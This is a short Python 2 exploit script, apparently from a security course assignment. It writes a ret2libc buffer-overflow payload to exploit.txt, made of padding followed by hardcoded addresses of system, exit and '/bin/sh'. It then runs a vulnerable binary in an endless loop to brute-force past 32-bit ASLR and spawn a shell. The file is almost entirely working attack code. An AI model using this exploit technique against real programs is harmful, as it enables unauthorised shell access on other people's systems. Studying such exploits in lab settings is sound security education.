#!/usr/bin/env python2
import os

#define environmental variables
i=1
padding = 167* "A" ##buffer= 152 + offset of 12
systemaddr = "\x40\xf0\xe0\xf7"  ##found on gbd-pedas "print system", format adjusted for little edian"
exitaddr = "\x90\x19\xe0\xf7"  ##found on gbd-pedas "print exit", format adjusted for little edian"
binshaddr = "\x38\x63\xf5\xf7"##found on gbd-pedas "find "/bin/sh", format adjusted for little edian"

#creating the payload which we will feed to the program as a text file.
with open('exploit.txt', 'wb') as exploit:
    exploit.write(padding + systemaddr + exitaddr + binshaddr) #writes the above environment vars. 
    exploit.close
    print("exploit generated as exploit.txt")

#brute force loop to bypass ASLR on 32bit system. 
while True:
        print("BruteForce ASLR Trial Number " + str(i))
        os.system("~/Desktop/8042-a2-tmpl/app/VulnApp"+' '+"./exploit.txt")
        i=i+1

